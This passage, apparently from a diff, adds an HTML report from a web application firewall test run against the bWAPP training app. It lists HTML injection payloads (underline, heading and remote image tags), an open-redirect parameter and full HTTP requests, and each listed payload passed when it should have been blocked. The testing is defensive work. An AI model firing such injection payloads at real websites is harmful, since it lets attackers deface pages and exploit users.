+											<td class="option-value"><pre>ReturnUrl=http://www.itsecgames.com</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/unvalidated_redir_fwd_2.php?ReturnUrl=http://www.itsecgames.com HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_01</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_01</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>HTML Injection - Reflected (GET)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/htmli_get.php?firstname=%3Cu%3Ebugged!%3C%2Fu%3E&amp;lastname=%3Cu%3Ebugged!%3C%2Fu%3E&amp;form=submit</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;u&gt;Bugged!&lt;/u&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/htmli_get.php?firstname=%3Cu%3Ebugged!%3C%2Fu%3E&amp;lastname=%3Cu%3Ebugged!%3C%2Fu%3E&amp;form=submit HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_01</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_01</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>HTML Injection - Reflected (GET)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/htmli_get.php?firstname=%3Cu%3Ebugged!%3C%2Fu%3E&amp;lastname=%3Cu%3Ebugged!%3C%2Fu%3E&amp;form=submit</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;u&gt;Bugged!&lt;/u&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/htmli_get.php?firstname=%3Cu%3Ebugged!%3C%2Fu%3E&amp;lastname=%3Cu%3Ebugged!%3C%2Fu%3E&amp;form=submit HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_02</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_02</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>HTML Injection - Reflected (GET)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/htmli_get.php?firstname=%3Ch1%3Ebugged!%3C%2Fh1%3E&amp;lastname=%3Ch1%3Ebugged!%3C%2Fh1%3E&amp;form=submit</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;h1&gt;Bugged!&lt;/h1&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/htmli_get.php?firstname=%3Ch1%3Ebugged!%3C%2Fh1%3E&amp;lastname=%3Ch1%3Ebugged!%3C%2Fh1%3E&amp;form=submit HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_03</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_03</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>HTML Injection - Reflected (GET)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/htmli_get.php?firstname=%3Ch1%3EBugged%20by%3C%2Fh1%3E%3Cimg%20src%3D%22http%3A%2F%2Fwww.mmeit.be%2Fimages%2Fheader_6.jpg%22%3E%3C!--&amp;lastname=%3Ch1%3EBugged%20by%3C%2Fh1%3E%3Cimg%20src%3D%22http%3A%2F%2Fwww.mmeit.be%2Fimages%2Fheader_6.jpg%22%3E%3C!--&amp;form=submit</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;h1&gt;Bugged by&lt;/h1&gt;&lt;img src=&#34;http://www.mmeit.be/images/header_6.jpg&#34;&gt;&lt;!--</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/htmli_get.php?firstname=%3Ch1%3EBugged%20by%3C%2Fh1%3E%3Cimg%20src%3D%22http%3A%2F%2Fwww.mmeit.be%2Fimages%2Fheader_6.jpg%22%3E%3C!--&amp;lastname=%3Ch1%3EBugged%20by%3C%2Fh1%3E%3Cimg%20src%3D%22http%3A%2F%2Fwww.mmeit.be%2Fimages%2Fheader_6.jpg%22%3E%3C!--&amp;form=submit HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_04</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_04</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>HTML Injection - Reflected (POST)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/htmli_post.php</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;u&gt;Bugged!&lt;/u&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>POST /bWAPP/htmli_post.php HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Content-Length: 80
+Connection: keep-alive
+
+firstname=%3Cu%3Ebugged!%3C%2Fu%3E&amp;lastname=%3Cu%3Ebugged!%3C%2Fu%3E&amp;form=submit</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_05</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_05</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>HTML Injection - Reflected (POST)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/htmli_post.php</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;h1&gt;Bugged!&lt;/h1&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>POST /bWAPP/htmli_post.php HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Content-Length: 84
+Connection: keep-alive
+
+firstname=%3Ch1%3Ebugged!%3C%2Fh1%3E&amp;lastname=%3Ch1%3Ebugged!%3C%2Fh1%3E&amp;form=submit</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_06</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_06</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>HTML Injection - Reflected (POST)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/htmli_post.php</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;h1&gt;Bugged by&lt;/h1&gt;&lt;img src=&#34;http://www.mmeit.be/images/header_6.jpg&#34;&gt;&lt;!--</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>POST /bWAPP/htmli_post.php HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Content-Length: 250
+Connection: keep-alive
+
+firstname=%3Ch1%3EBugged%20by%3C%2Fh1%3E%3Cimg%20src%3D%22http%3A%2F%2Fwww.mmeit.be%2Fimages%2Fheader_6.jpg%22%3E%3C!--&amp;lastname=%3Ch1%3EBugged%20by%3C%2Fh1%3E%3Cimg%20src%3D%22http%3A%2F%2Fwww.mmeit.be%2Fimages%2Fheader_6.jpg%22%3E%3C!--&amp;form=submit</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_07</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_07</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>HTML Injection - Reflected (URL)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/htmli_current_url.php?&lt;h1&gt;Bugged by&lt;/h1&gt;&lt;img src=&#34;http://www.mmeit.be/images/header_6.jpg&#34;&gt;&lt;!--</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;u&gt;Bugged!&lt;/u&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/htmli_current_url.php?%3Ch1%3EBugged%20by%3C/h1%3E%3Cimg%20src=%22http://www.mmeit.be/images/header_6.jpg%22%3E%3C!-- HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_08</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_08</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>HTML Injection - Stored (Blog)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/htmli_stored.php</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;u&gt;Bugged!&lt;/u&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>POST /bWAPP/htmli_stored.php HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Content-Length: 53
+Connection: keep-alive
+
+entry=%3Cu%3Ebugged!%3C%2Fu%3E&amp;blog=submit&amp;entry_add=</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_09</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_09</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>HTML Injection - Stored (Blog)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/htmli_stored.php</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;h1&gt;Bugged!&lt;/h1&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>POST /bWAPP/htmli_stored.php HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Content-Length: 55
+Connection: keep-alive
+
+entry=%3Ch1%3EBugged!%3C%2Fh1%3E&amp;blog=submit&amp;entry_add=</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_10</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_10</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>HTML Injection - Stored (Blog)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/htmli_stored.php</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;h1&gt;Bugged by&lt;/h1&gt;&lt;img src=&#34;http://www.mmeit.be/images/header_6.jpg&#34;&gt;&lt;!--</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>POST /bWAPP/htmli_stored.php HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Content-Length: 138
+Connection: keep-alive
+
+entry=%3Ch1%3Ebugged%20by%3C%2Fh1%3E%3Cimg%20src%3D%22http%3A%2F%2Fwww.mmeit.be%2Fimages%2Fheader_6.jpg%22%3E%3C!--&amp;blog=submit&amp;entry_add=</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_21</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
